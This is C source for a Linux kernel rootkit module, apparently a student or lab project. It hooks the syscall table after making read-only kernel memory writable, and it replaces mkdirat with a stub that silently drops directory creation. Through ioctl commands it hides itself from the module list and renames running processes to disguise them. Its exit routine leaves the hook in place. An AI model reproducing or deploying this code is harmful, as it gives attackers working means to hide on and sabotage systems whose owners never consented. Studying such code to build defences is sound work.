#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"
#define PAGE_KERNEL __pgprot(PROT_NORMAL)
#define PAGE_KERNEL_RO __pgprot((PROT_NORMAL & ~PTE_WRITE) | PTE_RDONLY)

// for modify the syscall table permision
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
// rodata segment
unsigned long start_rodata;
unsigned long init_begin;

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);
static sys_call_t *sys_call_table_addr;
static sys_call_t original_write;

// setup kprobe
typedef unsigned long (*kallsyms_func)(const char *name);
static kallsyms_func kallsyms_func_ptr;

/* setup pre-handler */
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    return 0;
}

/* setup post-handler */
static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{

}

struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
    .pre_handler = handler_pre,
    .post_handler = handler_post,
};

// construct a linked list to store the filter syscall
static LIST_HEAD(filter_list);
static struct filter_info *find_filter(int syscall_nr, const char *comm) {
    struct filter_info *entry;
    list_for_each_entry(entry, &filter_list, list) {
        if (entry->syscall_nr == syscall_nr && !strncmp(entry->comm, comm, TASK_FILTER_LEN)) {
            return entry;
        }
    }
    return NULL;
}


// 自訂的 write syscall hook
asmlinkage long hooked_write(const struct pt_regs *regs) {
    struct filter_info *filter;
    filter = find_filter(__NR_write, current->comm);
    
    if (filter) {
        printk(KERN_INFO "[rootkit] blocked write syscall from %s\n", current->comm);
        return -EPERM; // 或其他合適的錯誤碼
    }

    return original_write(regs);
}

asmlinkage long hooked_mkdir(const struct pt_regs *regs) {
    printk("hook mkdir sys_call\n");
    return 0;
}

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

/* For IOCTL_MOD_HIDE */
static int hidden = 0; // check if module is hidden or not
static struct list_head *prev_module = NULL; // keep track of the original module location

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg) {
    long ret = 0;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        if (!hidden) {
            prev_module = THIS_MODULE->list.prev; // keep track of the previous module of the current module
            list_del(&THIS_MODULE->list); // remove from module list
            hidden = 1;
            printk(KERN_INFO "rootkit: Module hidden\n");
        } else {
            list_add(&THIS_MODULE->list, prev_module); // reinsert the module
            hidden = 0;
            printk(KERN_INFO "rootkit: Module unhidden\n");
        }
        break;

    case IOCTL_MOD_MASQ:
        {
            struct masq_proc_req req;
            struct masq_proc *proc_list;
            int i;

            // copy data from user space to kernel space
            if (copy_from_user(&req, (void __user *)arg, sizeof(struct masq_proc_req))) {
                ret = -EFAULT;
                break;
            }

            // Allocate memory for the list of processes
            proc_list = kmalloc(sizeof(struct masq_proc) * req.len, GFP_KERNEL);
            if (!proc_list) {
                ret = -ENOMEM;
                break;
            }

            // copy the list of masq_proc from user space
            if (copy_from_user(proc_list, req.list, sizeof(struct masq_proc) * req.len)) {
                kfree(proc_list);
                ret = -EFAULT;
                break;
            }

            // Iterate through each entity in the list and masquerade process names
            for (i = 0; i < req.len; i++) {
                struct masq_proc *proc = &proc_list[i];
                struct task_struct *task; // defined in linux/sched.h
                int found = 0;

                // Iterate through all tasks (processes)
                for_each_process(task) {
                    // check if task name matches orig_name
                    if (strncmp(task->comm, proc->orig_name, MASQ_LEN) == 0) {
                        // if the new name is shorter than the origin, masquerade it
                        // if (strlen(proc->new_name) < strlen(proc->orig_name))
                        if (strlen(proc->new_name) < 16) {
                            // strncpy(task->comm, proc->new_name, 16 '''sizeof(task->comm) - 1''');
                            strncpy(task->comm, proc->new_name, 16);
                            // Make sure there is a null terminator at the end
                            task->comm[sizeof(task->comm) - 1] = '\0';  
                            found = 1;
                            printk(KERN_INFO "rootkit: Masqueraded process %s -> %s", proc->orig_name, proc->new_name);
                        }
                        break;
                    }
                }

                if (!found) {
                    printk(KERN_WARNING "rootkit: Process %s not found for masquerading\n", proc->orig_name);
                }
            }

            // free allocated memory for process list
            kfree(proc_list);
        }
        break;

    case IOCTL_ADD_FILTER: {
        
        break;
    }

    case IOCTL_REMOVE_FILTER:
        
        break;

    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static int ret;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    // register kprobe
    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return ret;
    }
    kallsyms_func_ptr = (kallsyms_func)kp.addr;
    unregister_kprobe(&kp);
    pr_info("Address of kallsyms_lookup_name: %p\n", kallsyms_func_ptr);
    pr_info("Address of sys_call_table: %lu\n", kallsyms_func_ptr("sys_call_table"));

    // get the address of syscall table
    sys_call_table_addr = (sys_call_t *)kallsyms_func_ptr("sys_call_table");
    pr_info("Address of sys_call_table: %p\n", sys_call_table_addr);
    pr_info("Address of sys_call_write: %p\n", sys_call_table_addr[__NR_write]);

    // 是第 __NR_write 個系統呼叫的函數指標，指向原始的 write 系統呼叫函數
    // 將原始函數指標存起來
    original_write = sys_call_table_addr[__NR_write]; 
    pr_info("Address of sys_call_write: %p\n", original_write);

    // hook the write syscall
    update_mapping_prot = (void *)kallsyms_func_ptr("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_func_ptr("__start_rodata");
    init_begin = (unsigned long)kallsyms_func_ptr("__init_begin");
    pr_info("Address of update_mapping_prot : %p\n", update_mapping_prot);
    pr_info("Address of start_rodata : %lu\n", start_rodata);
    pr_info("Address of init_begin : %lu\n", init_begin);
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL);
    // sys_call_table[__NR_write] = hooked_write;
    sys_call_table_addr[__NR_mkdirat] = hooked_mkdir;
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);

    return 0;
}

static void __exit rootkit_exit(void) {
    // TODO: unhook syscall and cleanup syscall filter list

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
